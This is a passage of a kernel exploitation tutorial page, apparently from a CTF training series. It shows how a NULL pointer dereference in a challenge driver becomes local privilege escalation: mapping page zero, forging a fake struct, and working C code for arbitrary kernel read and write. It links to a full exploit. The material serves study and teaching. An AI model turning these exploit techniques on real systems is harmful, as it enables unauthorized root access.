+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/angus&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//angus_init();</span></span><br><span class="line">  angus_encrypt();</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>When you run this, the kernel should panic like this:</p>
+<center>
+  <img src="img/angus_crash.png" alt="Crash output" style="width:640px;">
+</center>
+<p>The BUG line says <code>kernel NULL pointer dereference, address: 0000000000000008</code>, confirming exactly the behavior we identified. NULL pointer dereferences also happen in userland, but there they are usually not exploitable. So why is this one exploitable for LPE?</p>
+<h2 id="Virtual-memory-and-mmap-min-addr">Virtual memory and <code>mmap_min_addr</code></h2>
+<p>According to the <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt">Linux memory layout documentation</a>, different virtual address ranges are used for different purposes. For example, <code>0000000000000000</code> through <code>00007fffffffffff</code> belongs to userland. Meanwhile, <code>ffffffff80000000</code> through <code>ffffffff9fffffff</code> is a kernel data region.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
+  <p class="says">
+    On Linux, 48-bit virtual addresses are sign-extended to 64 bits. That is why the range from `0x800000000000` to `0xffff7fffffffffff` is non-canonical and therefore invalid as an address.
+  </p>
+</div>
+<p>The key point is that <code>0000000000000000</code> through <code>00007fffffffffff</code> is userland.<br>
+That means if address <code>0</code> is mapped, dereferencing a NULL pointer will not automatically segfault; the code may instead read or write attacker-controlled data placed at page zero.</p>
+<p>In kernel space, if SMAP is disabled, the kernel may read userland memory during a NULL pointer dereference. So an attacker can intentionally place fake data at address <code>0</code> and make the kernel use it.</p>
+<p>Normally, passing <code>0</code> as the first argument to <code>mmap</code> lets the kernel choose the address. But with <code>MAP_FIXED</code>, <code>mmap</code> must place the mapping exactly at the requested address or fail. That lets us map page zero directly. Since KPTI is enabled, remember to include <code>MAP_POPULATE</code> as well.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">     MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,</span><br><span class="line">     <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p>This works on the challenge machine, but it will usually fail on a normal Linux system. That is because of the mitigation variable <code>mmap_min_addr</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/vm/mmap_min_addr</span><br><span class="line">65536</span><br></pre></td></tr></table></figure>
+<p>Userland may not map memory below that address. That is why NULL pointer dereference is normally unexploitable. But in this challenge, <code>mmap_min_addr</code> is <code>0</code>, so the attack becomes possible.</p>
+<h2 id="Privilege-escalation">Privilege escalation</h2>
+<p>Because the driver dereferences an <code>XorCipher</code> through a NULL pointer, the attacker can prepare a fake <code>XorCipher</code> object at address <code>0</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *key;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">  <span class="type">size_t</span> keylen;</span><br><span class="line">  <span class="type">size_t</span> datalen;</span><br><span class="line">&#125; XorCipher;</span><br></pre></td></tr></table></figure>
+<p>If we control <code>data</code> and <code>datalen</code>, <code>CMD_GETDATA</code> can read arbitrary kernel addresses. If we control <code>data</code>, <code>datalen</code>, <code>key</code>, and <code>keylen</code> appropriately, we can also overwrite arbitrary kernel memory.</p>
+<p>So this single bug gives us a very strong AAR/AAW primitive. <code>CMD_GETDATA</code> uses <code>copy_to_user</code> to move data from kernel space into userland:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(req.ptr, ctx-&gt;data, req.len)) <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p>Functions such as <code>copy_to_user</code> and <code>copy_from_user</code> are designed to fail safely rather than crashing when given invalid addresses. So even with KASLR enabled, you can probe potential kernel addresses until <code>copy_to_user</code> succeeds.</p>
+<p>In any case, let’s first build AAR/AAW and verify the implementation by reading and writing userland data:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">XorCipher *nullptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AAR</span><span class="params">(<span class="type">char</span> *dst, <span class="type">char</span> *src, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  nullptr-&gt;data = src;</span><br><span class="line">  nullptr-&gt;datalen = len;</span><br><span class="line">  angus_getdata(dst, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AAW</span><span class="params">(<span class="type">char</span> *dst, <span class="type">char</span> *src, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="comment">// Since xor is used for AAW, first read the original data</span></span><br><span class="line">  <span class="type">char</span> *tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) fatal(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">  AAR(tmp, dst, len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adjust so that xor produces the desired bytes</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    tmp[i] ^= src[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write</span></span><br><span class="line">  nullptr-&gt;data = dst;</span><br><span class="line">  nullptr-&gt;datalen = len;</span><br><span class="line">  nullptr-&gt;key = tmp;</span><br><span class="line">  nullptr-&gt;keylen = len;</span><br><span class="line">  angus_encrypt();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/angus&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prepare a fake XorCipher at the NULL page</span></span><br><span class="line">  <span class="keyword">if</span> (mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">           MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE,</span><br><span class="line">           <span class="number">-1</span>, <span class="number">0</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Test AAR/AAW</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">  AAR(buf, <span class="string">&quot;Hello, World!&quot;</span>, <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;AAR: %s\n&quot;</span>, buf);</span><br><span class="line">  AAW(buf, <span class="string">&quot;This is a test&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;AAW: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The AAR/AAW primitive works.</p>
+<center>
+  <img src="img/angus_aaraaw.png" alt="Building the AAR/AAW primitive" style="width:280px;">
+</center>
+<p>From there, you can leak the kernel base, search for the <code>cred</code> structure, and use any privilege-escalation route you like. A sample exploit is available <a href="exploit/angus_exploit.c">here</a>.</p>
+<center>
+  <img src="img/angus_privesc.png" alt="Privilege escalation" style="width:320px;">
+</center>
+<hr>
+<div class="column" title="Exercise">
+  Experiment with ways to find the <code>cred</code> structure, recover the kernel base address, and so on. Which technique is fastest on average? What are the pros and cons of each method?
+</div>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK01/race_condition.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK03/double_fetch.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
